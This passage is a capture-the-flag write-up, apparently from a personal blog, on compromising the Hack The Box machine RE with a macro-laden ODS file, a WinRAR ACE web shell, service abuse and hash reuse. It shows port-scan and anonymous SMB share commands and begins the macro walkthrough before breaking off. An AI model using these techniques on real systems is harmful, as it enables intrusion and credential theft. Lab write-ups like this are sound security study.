@@ -1,0 +1,1369 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.64.1" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - RE | text/plain</title>
+    <meta name="description" content="Write-up for the machine RE from Hack The Box.
+A fun one if you like Client-side exploits. You check out the
+website and find a blog with plenty of information on bad Office
+macros and malware analysis. A writable SMB share called
+&#34;malware_dropbox&#34; invites you do upload a prepared .ods file,
+which is all you need for the initial shell.
+The script that processes these uploads contains comments with
+hints about downstream .rar file processing. You guess this
+must be about the WinRAR ACE vulnerability, prepare an archive
+which writes a web shell and voilà, you get another shell.
+This is where the intended way would have been to upload yet
+another malicious file, this time exploiting an XXE in Ghidra.
+I did it in a different way though, by service abuse to 
+become SYSTEM. Surprisingly, this was not enough to read the 
+flag. It is encrypted with EFS and only the right user can 
+read it. As SYSTEM though it is easy to impersonate this user
+since we get all the NT hashes and and can pass them to WinRM,
+which can be accessed remotely after forwarding the port.
+">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - RE" />
+<meta property="og:description" content="Write-up for the machine RE from Hack The Box.
+A fun one if you like Client-side exploits. You check out the
+website and find a blog with plenty of information on bad Office
+macros and malware analysis. A writable SMB share called
+&#34;malware_dropbox&#34; invites you do upload a prepared .ods file,
+which is all you need for the initial shell.
+The script that processes these uploads contains comments with
+hints about downstream .rar file processing. You guess this
+must be about the WinRAR ACE vulnerability, prepare an archive
+which writes a web shell and voilà, you get another shell.
+This is where the intended way would have been to upload yet
+another malicious file, this time exploiting an XXE in Ghidra.
+I did it in a different way though, by service abuse to 
+become SYSTEM. Surprisingly, this was not enough to read the 
+flag. It is encrypted with EFS and only the right user can 
+read it. As SYSTEM though it is easy to impersonate this user
+since we get all the NT hashes and and can pass them to WinRM,
+which can be accessed remotely after forwarding the port.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_re/" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
+<meta property="article:published_time" content="2020-02-21T00:00:00+01:00" />
+<meta property="article:modified_time" content="2020-02-21T00:00:00+01:00" />
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_re/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Hack The Box Write-up - RE">
+<meta itemprop="description" content="Write-up for the machine RE from Hack The Box.
+A fun one if you like Client-side exploits. You check out the
+website and find a blog with plenty of information on bad Office
+macros and malware analysis. A writable SMB share called
+&#34;malware_dropbox&#34; invites you do upload a prepared .ods file,
+which is all you need for the initial shell.
+The script that processes these uploads contains comments with
+hints about downstream .rar file processing. You guess this
+must be about the WinRAR ACE vulnerability, prepare an archive
+which writes a web shell and voilà, you get another shell.
+This is where the intended way would have been to upload yet
+another malicious file, this time exploiting an XXE in Ghidra.
+I did it in a different way though, by service abuse to 
+become SYSTEM. Surprisingly, this was not enough to read the 
+flag. It is encrypted with EFS and only the right user can 
+read it. As SYSTEM though it is easy to impersonate this user
+since we get all the NT hashes and and can pass them to WinRM,
+which can be accessed remotely after forwarding the port.
+">
+<meta itemprop="datePublished" content="2020-02-21T00:00:00&#43;01:00" />
+<meta itemprop="dateModified" content="2020-02-21T00:00:00&#43;01:00" />
+<meta itemprop="wordCount" content="2336">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - RE</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>11 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2020-02-21T00:00:00&#43;01:00">21 Feb, 2020</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the machine RE from Hack The Box.
+A fun one if you like Client-side exploits. You check out the
+website and find a blog with plenty of information on bad Office
+macros and malware analysis. A writable SMB share called
+&#34;malware_dropbox&#34; invites you do upload a prepared .ods file,
+which is all you need for the initial shell.
+The script that processes these uploads contains comments with
+hints about downstream .rar file processing. You guess this
+must be about the WinRAR ACE vulnerability, prepare an archive
+which writes a web shell and voilà, you get another shell.
+This is where the intended way would have been to upload yet
+another malicious file, this time exploiting an XXE in Ghidra.
+I did it in a different way though, by service abuse to 
+become SYSTEM. Surprisingly, this was not enough to read the 
+flag. It is encrypted with EFS and only the right user can 
+read it. As SYSTEM though it is easy to impersonate this user
+since we get all the NT hashes and and can pass them to WinRM,
+which can be accessed remotely after forwarding the port.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#malicious-ods-macro">Malicious ODS Macro</a>
+      <ul>
+        <li><a href="#discovering-the-malware-dropbox">Discovering the malware dropbox</a></li>
+        <li><a href="#creating-the-macro">Creating the macro</a></li>
+      </ul>
+    </li>
+    <li><a href="#malicious-rar-file">Malicious RAR file</a>
+      <ul>
+        <li><a href="#discovering-the-winrar-vulnerability">Discovering the WinRAR vulnerability</a></li>
+        <li><a href="#exploiting-winrar">Exploiting WinRAR</a></li>
+        <li><a href="#upgrading-the-shell">Upgrading the shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#abusing-usosvc-service">Abusing UsoSvc Service</a>
+      <ul>
+        <li><a href="#discovering-the-service">Discovering the service</a></li>
+        <li><a href="#exploitation-the-access">Exploitation the access</a></li>
+      </ul>
+    </li>
+    <li><a href="#pivoting-to-coby">Pivoting to coby</a>
+      <ul>
+        <li><a href="#meterpreter-and-incognito">Meterpreter and Incognito</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="re">RE</h1>
+<h2 id="port-scan">Port scan</h2>
+<p>As usual, I started with a full TCP port scan.
+Only two ports were open:</p>
+<pre><code>root@Kali:~# nmap -p- --reason --min-rate 2000 10.10.10.144
+...
+PORT    STATE SERVICE      REASON
+80/tcp  open  http         syn-ack ttl 127
+445/tcp open  microsoft-ds syn-ack ttl 127
+...
+</code></pre><h2 id="malicious-ods-macro">Malicious ODS Macro</h2>
+<h3 id="discovering-the-malware-dropbox">Discovering the malware dropbox</h3>
+<p>On port 80, accessed by IP, I found a website that redirects to &ldquo;<code>reblog.htb</code>&rdquo;.
+I added an entry to &ldquo;<code>/etc/hosts</code>&rdquo; to resolve this hostname to
+&ldquo;<code>10.10.10.144</code>&rdquo;, then visited the site.
+Now there was a blog hosted on IIS 10 operated on Windows Server,
+presenting a few articles about ODS macro files.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/01_homepage.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Homepage of reblog.htb</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Most importantly, the first entry contained a hint that this box was about a
+client-side exploit. The text was:</p>
+<pre><code>The SOC has been seeing lots of phishing attempts with ods attachements lately.
+It seems that we’ve got rules in place to detect any run of the mill stuff,
+including documents that are generated by Metasploit, documents with powershell
+or cmd invocations.
+
+If you see any interesting documents that might get past our yara rules,
+please drop them in the malware dropbox. I’ve got some automated processing
+that will see if our rules already identify it, and if not, run it to collect
+some log data and queue it for further analysis.
+</code></pre><p>There was a 2nd virtual host &ldquo;<code>re.htb</code>&rdquo; which I also added to the hosts file.
+It returned only a single sentence saying &ldquo;Ghidra Dropbox coming soon!&quot;.
+There were also comments in the HTML.
+They contained some instructions how to upload files to this dropbox.
+For now, this was nothing but a red herring. It would have been relevant later
+if you would follow the intended route (but I did not).</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/02_ghidra_red_hering.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>HTML comments contain instructions about future features, which are not yet implemented</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>If you ask yourself &ldquo;Where is this malware dropbox?&rdquo; then look at port 445.
+I listed shares and found one called &ldquo;<code>malware_dropbox</code>&rdquo; (type empty password):</p>
+<pre><code>root@Kali:~# smbclient -N -L \\\\10.10.10.144
+Enter WORKGROUP\root's password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        IPC$            IPC       Remote IPC
+        malware_dropbox Disk
+...
+</code></pre><p>A quick test showed that I could also mount this share and write files to it,
+which disappeared only seconds after writing them:</p>
+<pre><code>root@Kali:~# mount //10.10.10.144/malware_dropbox /mnt/smb/
+Password for root@//10.10.10.144/malware_dropbox:
+root@Kali:~# cd /mnt/smb/
+root@Kali:/mnt/smb# ls
+root@Kali:/mnt/smb# touch f1 &amp;&amp; ls
+f1*
+root@Kali:/mnt/smb# sleep 3
+root@Kali:/mnt/smb# ls
+root@Kali:/mnt/smb#
+</code></pre><p>The goal now was to craft a malicious macro, possibly bypassing these nasty
+Yara rules mentioned in the blog post.</p>
+<h3 id="creating-the-macro">Creating the macro</h3>
+<p>The following is a quick walkthrough for how to create macros. You have to have
+LibreOffice installed, which is quite a sizable download. Alternatively
+you could also try your luck getting one out of Metasploit (cf.
+<a href="https://blog.rapid7.com/2017/03/08/attacking-microsoft-office-openoffice-with-metasploit-macro-exploits/">here</a>),
+but I guess the Yara rules would probably detect it. The manual way gives you
+full control over the payload.</p>
+<p>Now, open LibreOffice Calc, then go to &ldquo;Tools&rdquo;, &ldquo;Macros&rdquo;, &ldquo;Organize Macros&rdquo;, then
+&ldquo;Basics&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/03_ods_create_macro_1.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Open macro organizer</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now select the current document (&ldquo;Untitled 1&rdquo;, unless you already saved the
+document), and hit &ldquo;New&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/23_htb_re/04_ods_create_macro_2.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Open macro organizer</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
